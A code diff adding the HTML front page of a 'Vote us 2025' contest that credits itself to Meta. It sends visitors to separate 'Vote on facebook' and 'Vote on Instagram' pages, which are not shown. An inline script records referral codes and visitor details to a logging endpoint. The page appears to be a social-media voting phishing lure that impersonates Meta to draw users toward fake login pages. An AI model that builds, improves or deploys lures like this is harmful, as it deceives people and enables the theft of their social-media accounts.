@@ -1,0 +1,141 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <meta http-equiv="X-UA-Compatible" content="IE=edge">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+
+  <!-- Primary Meta Tags -->
+  <title>Nexa lab</title>
+  <meta name="title" content="StudyForge — Learn. Build. Forge Your Future.">
+  <meta name="description" content="StudyForge is your digital workshop for mastering coding, design, and creativity — one project at a time.">
+
+  <!-- Favicon & App Icons -->
+  <link rel="icon" type="image/svg+xml" href="/assets/icons/icon.svg">
+  <link rel="apple-touch-icon" href="/assets/icons/logo.svg">
+
+  <!-- Theme Color (for mobile browsers) -->
+  <meta name="theme-color" content="#FF8A00">
+
+  <!-- Fonts (optional, clean sans-serif vibe) -->
+  <link rel="preconnect" href="https://fonts.googleapis.com">
+  <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+  <link href="https://fonts.googleapis.com/css2?family=Poppins:wght@400;600;800&display=swap" rel="stylesheet">
+
+  <!-- Styles -->
+  <link rel="stylesheet" href="style.css">
+
+  <!-- SEO & Social Sharing -->
+  <meta property="og:type" content="website">
+  <meta property="og:url" content="https://studyforge.vercel.app/">
+
+  <meta property="og:image" content="/assets/icons/logo.svg">
+  <link rel="preconnect" href="https://fonts.googleapis.com">
+<link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+<link href="https://fonts.googleapis.com/css2?family=Roboto:ital,wght@0,100..900;1,100..900&display=swap" rel="stylesheet">
+  <meta name="twitter:image" content="/assets/icons/logo.svg">
+  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.6.0/css/all.min.css">
+  <script src="main.js"type="module"></script>
+<script>
+  const params = new URLSearchParams(window.location.search);
+  const referralCode = params.get("ref") || "direct";
+
+  // save referral for signup
+  localStorage.setItem("referralCode", referralCode);
+
+  // only track once per session per page
+  const visitKey = `visit_${referralCode}_${window.location.pathname}`;
+  if (!sessionStorage.getItem(visitKey)) {
+    fetch("http://localhost:5000/api/visit/log", {
+      method: "POST",
+      headers: { "Content-Type": "application/json" },
+      body: JSON.stringify({
+        path: window.location.pathname,
+        referrer: referralCode,
+        utm: { source: "referralSite" },  // now an object
+        userAgent: navigator.userAgent
+      })
+    })
+    .then(res => res.json())
+    .then(data => console.log("Visit tracked:", data))
+    .catch(err => console.error("Visit tracking failed:", err));
+
+    sessionStorage.setItem(visitKey, "true");
+  }
+</script>
+</head>
+
+<body> 
+  <div class="card-container">
+      <div class="card-header">
+        <div class="icon">
+            <img src="assets/yellow-ballot-box.jpg" alt="Champion cup"class="ballot" />
+        </div>
+      
+     
+      </div>
+    <div class="card">
+      <div class="language-selector"data-role="lang"data-target="languages">
+         <span class="text_">
+            <span class="fas fa-language">
+          </span>
+          <span class="text">
+           English (US)
+         </span>
+         </span>
+         <span class="fas fa-chevron-down">
+           
+         </span>
+        </div>
+      <div class="card-body">
+        <div class="card-img">
+        
+          <img src="assets/champ.jpeg" alt=""class="champ" />
+          <h1 class="card-title">
+            The People's pick
+          </h1>
+        </div>
+        <div class="card-content">
+          <div class="prof-con">
+            <div class="img-con">
+              <img src="assets/check-mark.png" alt="Check mark"class="check-mark "/>
+            </div>
+            <div class="prof-text">
+              <h3>
+                Vote us 2025 🏅🏅🎉🎊
+              </h3>
+              <span class="vote-count text-sm">
+                900 votes .#3
+              </span>
+            </div>
+          </div>
+          <p>
+            I need your support! Please take a moment to cast your vote and help me reach new heights in this competition. <strong>Your vote</strong> could be the difference-maker, propelling me toward victory
+          </p>
+          <div class="btn-con">
+            <button class="btn main-btn start v facebook-vote"data-target="f.html"data-role="id"id="face">
+              <span class="fa-brands fa-facebook fa-lg"></span>
+              <span class="btn-text">Vote on facebook</span>
+            </button>
+            <button class="btn main-btn v instagram-vote start"data-target="i.html"data-role="html"id="insta">
+              <span class="fa-brands fa-instagram fa-lg"></span>
+              <span class="btn-text">Vote on Instagram</span>
+            </button>
+          </div>
+        </div>
+      </div>
+    </div>
+    <div class="footer">
+      <img src="assets/Nexa-logo.svg"class="nexa-logo"alt="Nexa logo" />
+      <span class="copyright text-sm">
+       <span class="copy-icon"> &COPY;</span> 2025 Meta
+      </span>
+    </div>
+  </div>
+  
+  
+
+
+
+</body>
+</html>
